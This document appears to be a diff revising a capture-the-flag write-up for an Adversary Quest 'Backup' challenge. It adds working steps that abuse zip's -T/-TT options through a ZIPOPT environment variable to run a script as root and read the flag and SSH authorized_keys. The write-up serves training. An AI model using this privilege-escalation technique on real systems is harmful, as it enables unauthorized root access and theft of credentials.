@@ -10,7 +10,9 @@ https://adversary.quest/static/2022AdversaryQuest_Backup_Dummy_e70bb1beda5e74247
 
 ## TL;DR Summary
 
-TL;DR
+- The target operating system has a custom backup program, that will run a shell script with root privileges.
+- The shell script uses the archiving program *zip*.
+- The environment variable *ZIPOPT* can be abused to tell *zip* to use a custom program for archive testing, which will be run as root.
 
 ## Pre-Requisites
 
@@ -191,6 +193,22 @@ Oh - now that seems interesting. *The contents of this environment variable will
 
 A good resource for inspirational linux shenanigans is [GTFOBins](https://gtfobins.github.io). It does have an entry for [zip](https://gtfobins.github.io/gtfobins/zip/)!
 
+Reading up more about the options
+
+```txt
+       -T
+       --test
+              Test the integrity of the new zip file. If the check fails, the old zip file is unchanged and (with the -m option) no input files are removed.
+
+       -TT cmd
+       --unzip-command cmd
+              Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:
+
+               zip archive file1 file2 -T -TT "./unzip -tqq"
+
+              In cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command.  The return code is checked for success (0 on Unix).
+```
+
 One idea is to supply *zip* options to test the archive afterwards (`-T`) and to also supply a different unzip program for that test (`-TT`). Why not have `/bin/sh` do the test? :)
 
 ```console
@@ -203,41 +221,60 @@ test of /tmp/temp.zip FAILED
 zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
 ```
 
-Hmm. That didn't go as planned, too bad.
+Hmm. That didn't go as planned... yet.
 
-### Approach 2 - Redirect Output File and Include root's Home Directory
+### Approach 2 - Elevated Command Execution
 
-```console
-$ ZIPOPT=" -r /tmp/temp /root " ./backup
-        zip warning: name not matched: /srv/backup/2022-07-30T15:28:03+00:00.zip
-        zip warning: ignoring special file: /etc/systemd/system/apt-daily.timer
-        zip warning: name not matched: /etc/systemd/system/multi-user.target.wants/challenge.service
-        zip warning: ignoring special file: /etc/systemd/system/snapd.socket
-        zip warning: ignoring special file: /etc/systemd/system/apt-daily-upgrade.service
-        zip warning: ignoring special file: /etc/systemd/system/unattended-upgrades.service
-        zip warning: ignoring special file: /etc/systemd/system/apt-daily-upgrade.timer
-        zip warning: ignoring special file: /etc/systemd/system/fwupd-refresh.timer
-        zip warning: ignoring special file: /etc/systemd/system/sudo.service
-        zip warning: ignoring special file: /etc/systemd/system/snapd.service
-  adding: root/ (stored 0%)
-  adding: root/.bashrc (deflated 54%)
-  adding: root/.ssh/ (stored 0%)
-  adding: root/.ssh/authorized_keys (deflated 9%)
-  adding: root/.cache/ (stored 0%)
-  adding: root/.cache/motd.legal-displayed (stored 0%)
-  adding: root/flag.txt (stored 0%)
-  adding: root/.profile (deflated 20%)
-[...]
-```
-
-Now we can unpack the archive and retrieve the flag!
+Let's try to create a custom test program to feed to *zip* to gain command execution with root privileges. We could start with a shell script to list all files under `/root`.
 
 ```console
 $ cd /tmp
-$ unzip temp.zip
-$ cd root/
-$ cat flag.txt
-CS{ZIPOPT_shenanigans}
+$ echo "ls -laR /root > /tmp/rootdir.txt" > pwn.sh
+$ chmod +x pwn.sh
+$ ZIPOPT=" -T -TT /tmp/pwn.sh " /usr/local/sbin/backup 1>/dev/null 2>&1
+$ cat rootdir.txt 
+/root:
+total 28
+drwx------  4 root root 4096 Jul  6 12:31 .
+drwxr-xr-x 18 root root 4096 Jun 27 16:42 ..
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Jun 27 16:43 .cache
+-rw-r--r--  1 root root   23 Jul  6 12:33 flag.txt
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwx------  2 root root 4096 Jun 23 12:20 .ssh
+
+/root/.cache:
+total 8
+drwx------ 2 root root 4096 Jun 27 16:43 .
+drwx------ 4 root root 4096 Jul  6 12:31 ..
+-rw-r--r-- 1 root root    0 Jun 27 16:43 motd.legal-displayed
+
+/root/.ssh:
+total 12
+drwx------ 2 root root 4096 Jun 23 12:20 .
+drwx------ 4 root root 4096 Jul  6 12:31 ..
+-rw------- 1 root root  161 Jun 23 12:20 authorized_keys
 ```
+
+Awesome, that worked well! We have spotted the flag, but also `/root/.ssh/authorized_keys`!
+
+## Now it's Flag Time!
+
+Connect to the real target machine.
+
+```console
+$ echo "cat /root/flag.txt > /tmp/flag.txt" > pwn.sh
+$ echo "cat /root/.ssh/authorized_keys > /tmp/auth.txt" >> pwn.sh
+$ chmod +x pwn.sh 
+$ ZIPOPT=" -T -TT /tmp/pwn.sh " /usr/local/sbin/backup 1>/dev/null 2>&1
+$ cat flag.txt 
+CS{ZIPOPT_shenanigans}
+$ cat auth.txt 
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoTezo9v9hsEowLFIXfPrs2NydQ1f9+fP9/fwq2qciR9TeUEGHoOCfA44lAVfzorKmxrXWHpS7K0bSgCuLEFyc=
+```
+
+We got the flag, perfect.
+
+Going from here, we could likely do lots more shenanigens on the server...
 
 Flag: **CS{ZIPOPT_shenanigans}**
